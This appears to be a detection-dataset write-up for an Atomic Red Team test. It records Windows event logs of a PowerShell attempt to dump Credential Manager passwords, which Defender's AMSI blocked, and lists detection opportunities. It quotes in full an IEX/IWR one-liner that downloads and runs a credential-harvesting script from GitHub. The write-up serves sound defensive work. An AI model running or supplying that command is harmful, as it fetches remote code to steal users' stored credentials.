# T1555-2: Credentials from Password Stores — Dump Credentials from Windows Credential Manager With PowerShell [Windows Credentials]

## Technique Context

T1555 covers credential theft from password stores. This test uses a publicly available PowerShell script — `GetCredmanCreds.ps1` from the TriggerMan-S/Windows-Credential-Manager GitHub repository — to enumerate and dump Windows Credentials from the Credential Manager. The script invokes the Windows `CredEnumerate` API (via P/Invoke or .NET interop) to iterate stored credentials. Windows Credentials include domain authentication tokens, saved network shares, and explicitly saved application passwords. This approach does not require elevated privileges when accessing credentials belonging to the current user, but the test runs as SYSTEM.

## What This Dataset Contains

The dataset spans approximately 5 seconds (2026-03-14T00:37:18Z – 00:37:23Z) on ACME-WS02.

**The attack command is visible in Security EID 4688 and PowerShell EID 4104:**

> `"powershell.exe" & {IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force}`

PowerShell EID 4104 captures the command in a scriptblock, and EID 4103 records the `Invoke-WebRequest` module invocation with the exact GitHub URL (pinned commit hash `4ad208e70c80dd...`). Sysmon also records `whoami.exe` process creation (EID 1, tagged T1033) — a standard ART test framework pre-check.

**Windows Defender blocked the script.** PowerShell EID 4100 records:

> `Error Message = At line:1 char:1`
> `+ <#`
> `+ ~~`
> `This script contains malicious content and has been blocked by your antivirus software.`
> `Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`

This is the AMSI detection path: the script was downloaded successfully (the IWR completed, triggering a DNS query and HTTP fetch to GitHub), but when the IEX attempted to evaluate the retrieved content, AMSI scanned it and returned a block. The full script body was captured in a PowerShell EID 4103 `Invoke-Expression` parameter binding event before AMSI terminated execution, exposing the `CredEnumerate`-based logic.

The dataset does not include a Sysmon EID 22 DNS query entry, which is consistent with the note in the dataset.yaml that Sysmon's ProcessCreate is in include mode — the PowerShell process that made the DNS query may not have been tagged for capture in the network connect rules for this session.

## What This Dataset Does Not Contain (and Why)

**Successful credential enumeration.** Windows Defender's AMSI engine blocked the script at the `Invoke-Expression` boundary, before `Get-PasswordVaultCredentials` could execute. No CredEnumerate API calls, no credential dump output, and no file writes of credential data are present.

**A Sysmon EID 22 DNS event.** The DNS query to `raw.githubusercontent.com` was made by the PowerShell process before the AMSI block; however, the sysmon-modular include-mode filtering did not capture a DNS event for this session. The IWR success is implied by the AMSI block (Defender must have received the content to scan it) and is confirmed by the `Invoke-WebRequest` module log entry.

**Credential store file access.** No Sysmon EID 11 events for `%LOCALAPPDATA%\Microsoft\Credentials` are present; object access auditing is disabled in this environment.

## Assessment

This dataset captures a **Defender-blocked credential dump attempt**. The download phase completed; Defender's AMSI engine then scanned and blocked the `GetCredmanCreds.ps1` content at execution time. The telemetry faithfully records the attempt: the command line, the tool's GitHub URL, the downloaded script's function signatures, and the AMSI termination are all observable. This is a high-fidelity dataset for detections targeting the pre-execution phase of PowerShell-based credential theft, particularly the IEX-over-IWR pattern fetching known credential harvesting tools from GitHub.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104**: Scriptblock contains the full `IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/...' ...)` invocation. The repository URL and the function name `Get-PasswordVaultCredentials` are directly present.
- **PowerShell EID 4103**: `Invoke-WebRequest` module log records the exact URL including the pinned commit hash. Also records the downloaded script body via `Invoke-Expression` parameter binding, exposing the `CredEnumerate` P/Invoke code.
- **PowerShell EID 4100**: `ScriptContainedMaliciousContent` with `InvokeExpressionCommand` — a reliable indicator that AMSI blocked an IEX payload. This specific error ID combination is detectable.
- **Security EID 4688**: Command line for `powershell.exe` includes `IEX`, `IWR`, `Get-PasswordVaultCredentials`, and the GitHub URL — all of which are high-confidence indicators in combination.
- **Sysmon EID 1**: `whoami.exe` spawned from PowerShell as SYSTEM — a consistent ART test framework artifact that can be correlated with the PowerShell activity by timestamp and parent process GUID.
